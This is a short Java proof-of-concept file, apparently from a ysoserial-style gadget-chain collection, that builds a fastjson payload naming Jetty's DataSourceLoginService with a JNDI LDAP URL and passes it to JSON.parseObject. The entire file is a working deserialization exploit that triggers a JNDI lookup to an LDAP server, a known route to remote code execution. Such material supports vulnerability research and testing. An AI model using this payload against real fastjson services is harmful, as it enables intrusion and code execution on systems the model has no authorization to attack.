package ysoserial.payloads.tabbyGadgetChains.Jetty;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;

public class Poc1 {
    public static void main(String[] args) {
        String poc = "{\"@type\":\"org.eclipse.jetty.plus.security.DataSourceLoginService\",\"jndiName\":\"ldap://127.0.0.1:8990/test\"}";
        JSON.parseObject(poc, Feature.SupportNonPublicField);
    }
}
